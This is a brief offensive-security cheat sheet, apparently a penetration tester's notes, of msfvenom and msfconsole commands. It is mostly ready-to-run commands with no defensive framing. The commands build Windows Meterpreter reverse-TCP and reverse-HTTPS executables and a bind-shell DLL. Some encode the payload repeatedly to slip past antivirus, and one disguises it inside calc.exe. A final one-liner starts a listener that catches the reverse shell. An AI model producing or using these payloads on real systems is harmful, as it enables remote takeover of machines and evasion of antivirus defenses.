# Msfvenom

Examples of previously created MSFVenom payloads required in the different scenarios

##### Reverse TCP:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o meterpreter.exe
```

##### Encoded multiple times:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o meterpreter.exe
```

##### Add Windows Calc.exe as a template:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -x calc.exe -e x86/shikata_ga_nai -i 10 -f exe -o meterpreter.exe
```


##### Reverse HTTPS with proxy authentication:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=user HttpProxyPass=password LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o meterpreter.exe
```

##### Bind Shell - DLL Payload:
```
msfvenom --platform Windows -p windows/shell_bind_tcp LPORT=443 -f DLL -o bind_shell.dll
```

#### Encoding:

```
-e encoder type
-i how man times to encode
```
#### Filler and bad characters:
```
-n the amound of bytes to add at the beginning
-b exclude bad chars (\x00 common filler, searched for by AV)
```


##### MSF Console - start a listener/handler:
```
msfconsole -qx "use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set lhost 10.0.0.1;
set lport 443;
exploit -j"
```
